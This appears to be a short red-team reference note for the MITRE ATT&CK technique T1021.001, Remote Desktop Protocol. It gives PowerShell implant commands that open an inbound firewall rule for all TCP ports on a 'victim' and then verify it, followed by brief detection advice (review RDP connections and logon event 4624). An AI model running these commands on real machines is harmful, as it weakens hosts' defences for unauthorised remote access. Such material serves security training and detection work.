# [Remote Desktop Protocol](https://attack.mitre.org/techniques/T1021/001/)

## Exploit syntax:

```powershell
# Run the following command in your posh implant to your victim:

sharpps netsh.exe advfirewall firewall add rule name="enablerdp" dir=in action=allow protocol=tcp localport=any enable=yes

# Verify the
firewall rule has been created:
sharpps netsh.exe advfirewall firewall show rule status=enabled name=enablerdp 

```
---

* Note, add syntax for xfreerdp once added to parrot to utilize newly opened firewall on victim## Detection Technique:

---

## Detections
* Investigate all remote desktop connections.
* Investigate all event code 4624 ( remote logons )

---

## Resouces